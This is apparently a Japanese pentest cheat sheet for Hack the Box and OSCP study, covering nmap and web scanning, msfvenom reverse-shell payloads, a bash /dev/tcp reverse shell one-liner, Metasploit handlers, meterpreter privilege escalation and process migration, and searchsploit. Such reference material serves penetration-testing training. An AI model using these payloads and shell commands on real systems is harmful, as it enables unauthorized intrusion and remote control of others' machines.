## CheetSheet

Hack the Box の攻略や、OSCP 取得を目指すためのチートシートです。
悪用厳禁でお願いします><

日々更新していきます。

## 目次


- [Network Scan](#Network_scan)
  - [Nmap](#nmap)
- [Web Scan](#Web_scan)
  - [gobuster](#gobuster)
  - [dirb](#dirb)
  - [Nikto](#Nikto)
  - [davtest](#davtest)
  - [WPScan](#WPScan)
- [侵入](#侵入)
  - [reverse_shell](#reverse_shell)
    - [msfvenom_reverse_shell](#msfvenom_reverse_shell)
      - Windows(meterpreter)
      - Windows(netcatなど)
      - Linux
      - ASP(msfvenom)
    - [Handlers](#Handlers)
- [特権エスカレーション](#特権エスカレーション)
  - [metasploit local_exploit_suggester](#metasploit(local_exploit_suggester))
- [セキュリティ診断ツール](#セキュリティ診断ツール)
  - [Burp](#burp)
- [便利コマンド](#便利コマンド)
    
  


# Network_scan

### Nmap

基本コマンド

```
nmap -Pn -A 10.10.10.11

-Pn : ICMPのみでなく80,443番ポートにもTCPパケットを送り、同セグメントではARPも送信しホストの存在を判断
-A : OSの種類とそのバージョンを検知


nmap -sV -sC -Pn -oN sample.txt 10.10.10.5

-sC : デフォルトスクリプトでスキャン
-sV : バージョン検出
-oN : 通常出力
```

他に

```

nmap -sV -O -F --version-light 10.10.10.3


-sV: Probe open ports to determine service/version info
-O: Enable OS detection
-F: Fast mode - Scan fewer ports than the default scan
--version-light: Limit to most likely probes (intensity 2)


集中して大量にみたいときは、
nmap -A -v 10.10.10.3

-v  冗長性をあげる

```

全 port scan

```

nmap -A -p- -Pn 10.10.10.3

-p-: 全port scan

```


 known vulnerabilitiesに対して、調査したいとき

```
ex: port 445 に対して、

nmap -Pn -p 445 --script vuln 10.10.10.4

-p: Set destination port(s)

445: The open port we've discovered earlier

--script vuln: Check for specific known vulnerabilities and generally only report results if they are found
```

[参考](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-legacy/)

# Web_scan

### gobuster
ディレクトリスキャナー。  
隠されたディレクトリや公開範囲が間違えて設定されているものはないかを調べるために使用。

```
gobuster dir -t 100 -u <target url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,py -o <output filename>
```

- dir...ディレクトリ総当たり
- -t...スレッド数
- -u...URL指定
- -w...wordlistの指定
- -o...ファイル出力
- -x...拡張子指定


```
実際の使用例
gobuster dir -u http://10.10.10.37 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o blocky_gobuster

```

### dirb 

[リンク](https://medium.com/tech-zoom/dirb-a-web-content-scanner-bc9cba624c86)

```
　dirb http://172.17.0.2/mutillidae

 DIRB IS a Web Content Scanner.  It  looks  for  existing
 (and/or  hidden)  Web  Objects. 
 It  basically  works by launching a  dictionary  basesd  attack 
 against  a  web server and analizing the response.

```

### Nikto

[リンク](https://kaworu.jpn.org/security/Nikto)

Web 脆弱性スキャナ。
任意のWebサーバー（Apache、Nginx、IHS、OHS、Litespeedなど）で使用できる。
Webサイトのセキュリティ上の欠陥を識別して、見つかった各問題の詳細な参照を提供する。

```
nikto -h <target url> -Format txt -o <output filename>

-h...url指定
-Format...出力するファイルの拡張子を指定
-o...ファイルへ出力する
-ssl...SSLを使用するサイトで使用


ex): nikto -h http://10.10.10.15

```


### davtest

[リンク](https://tools.kali.org/web-applications/davtest)

DAVTest tests WebDAV enabled servers by uploading test executable files, and then (optionally) uploading files which allow for command execution or other actions directly on the target. It is meant for penetration testers to quickly and easily determine if enabled DAV services are exploitable.

```

davtest --url 10.10.10.14   

```


### WPScan
WordPressの脆弱性診断ツール。

```
wpscan -url <target url> -e u -t -vp --log <output filename>
```

- -url...対象のURL指定
- -e u...usernameの列挙
- -t...テーマを列挙
- -vp...脆弱性のあるプラグインを列挙
- --log...ファイル出力


```
実際の使用例

 wpscan --url 10.10.10.37 -e u
```

# 侵入

## reverse_shell

### msfvenom_reverse_shell

[CheetSheet](https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/)

#### Windows(meterpreter)
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
```

#### shell
```
bash -i >& /dev/tcp/[url]/[port] 0>&1

ex: bash -i >& /dev/tcp/10.10.14.15/4444 0>&1
```
better shell をとるのに使った　[リンク](https://codemonkeyism.co.uk/htb-shocker/)


#### Windows(netcatなど)
```
msfvenom -p windows/shell_reverse_tcp lhost=10.0.0.1 lport=4444 –f exe > reverse.exe
```

#### Linux
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o reverse.elf
```

#### ASP(msfvenom)

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f asp > reverse.asp
```


#### Handlers
```
use exploit/multi/handler
set payload <payload>   (set payload windows/meterpreter/reverse_tcp など)
set LHOST <ip address>
set LPORT <port number>
run
```


# 特権エスカレーション

## metasploit(local_exploit_suggester)

[https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/recon/local_exploit_suggester.md](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/recon/local_exploit_suggester.md)

meterpreterでシェルを手に入れている場合、local_exploit_suggesterを使うことで、特権昇格に使える exploit を探すことができる

```jsx
background

use post/multi/recon/local_exploit_suggester
```

```
session を interactive に戻す時
sessions -i 1

```

access denied の時、プロセスが原因？

ps　で root 権限で動いているプロセスを確認し、
[migrate コマンド](https://security.stackexchange.com/questions/90578/how-does-process-migration-work-in-meterpreter)使う  

```
migrate 1836

meterpreterプロンプト下でmigrateコマンドを使うことで、バックドアを既存のプロセスに統合させることが出来る
```

# セキュリティ診断ツール

### Burp
[リンク](https://persol-tech-s.co.jp/corporate/security/article.html?id=10)

ブラウザとサーバ間のHTTP通信をキャプチャし、通信内容を閲覧および改竄できるツール
BurpのProxy機能とはWebアプリケーションの通信でサーバにリクエストを送信する際に、BurpがHTTP通信をキャプチャして
通信内容の閲覧や通信内容の書き換えができる機能。

なぜ、このツールを使うか？

```
もちろんブラウザ上から入力フォームやGETパラメータに脆弱性を判定する診断データを入力して
脆弱性が存在するかチェックする事もできますが、Cookieやhiddenパラメータなどは画面上からでは
診断値を挿入できず、また脆弱性の有無はレスポンスヘッダやレスポンスボディ(HTMLソースなど)を見て判定するため、
ブラウザ上からでは効率よくチェックが行えません。
そのためWebアプリケーションセキュリティ診断ではプロキシツールを使用して作業を行います
```

# 便利コマンド

### searchsploit -m で、

- searchsploit -m

exploit を current directory へ copy

```
─$ searchsploit PRTG             
------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution                       | windows/webapps/46527.sh
PRTG Network Monitor < 18.1.39.1648 - Stack Overflow (Denial of Service)                   | windows_x86/dos/44500.py
PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting                                    | java/webapps/34108.txt


searchsploit -m windows/webapps/46527.sh

  -m, --mirror   [EDB-ID]    Mirror (aka copies) an exploit to the current working directory.

```

- searchsploit -x

```
searchsploit -x windows/remote/41738.py
-x エクスプロイトの中身を見る
```

### シェル整形

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

-c: command
              Specify  the  command  to  execute.

pty: pty モジュールは擬似端末(他のプロセスを実行してその制御をしている端末をプログラムで読み書きする)
     を制御する操作を定義

pty.spawn: プロセスを生成して制御端末を現在のプロセスの標準入出力に接続する。
            これは制御端末を読もうとするプログラムをごまかすために利用される。


### ファイル探索

Windws:

```
search -f user.txt
```

### Windows コマンド集
[リンク](https://windows.command-ref.com/cmd-dir.html)


### root 権限か確かめる

```

sudo id 
sudo groups

・sudo -l 
-l:	sudoを実行するユーザーに許可されているコマンドを一覧表示する。

・root になる
sudo su
su: switch user

sudo -i  でもできる
i: rootユーザーのデフォルトのシェルをログインシェルとして実行する

```

### python のlibrary がない

```
ex: impacket
 
github のreleases へいき、
wget https://github.com/SecureAuthCorp/impacket/releases/download/impacket_0_9_21/impacket-0.9.21.tar.gz

tar -zxvf impacket-0.9.21.tar.gz
cd impacket-0.9.21
pip install .

```


### PsExec
コマンドラインを、リモートで実行できる。
[リンク](https://medium.com/@jjlovesstudying/windows-version-of-ssh-using-psexec-bff7942db91b)
